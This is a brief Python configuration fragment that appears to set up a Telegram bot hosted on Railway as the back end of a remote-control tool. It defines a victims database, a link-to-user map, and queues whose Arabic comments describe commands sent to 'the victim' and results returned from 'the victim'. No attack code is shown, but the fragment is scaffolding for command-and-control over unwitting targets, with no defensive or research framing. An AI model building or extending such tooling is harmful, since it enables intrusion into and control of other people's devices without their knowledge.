import os

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")
DOMAIN = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "lumen-production-1c23.up.railway.app"

# قواعد البيانات الذاكرية لإدارة الطوابير والجلسات
LINK_TO_USER = {}
VICTIMS_DB = {}
COMMAND_QUEUES = {}  # طابور الأوامر الموجهة للضحية
RESPONSE_QUEUES = {} # طابور النتائج القادمة من الضحية
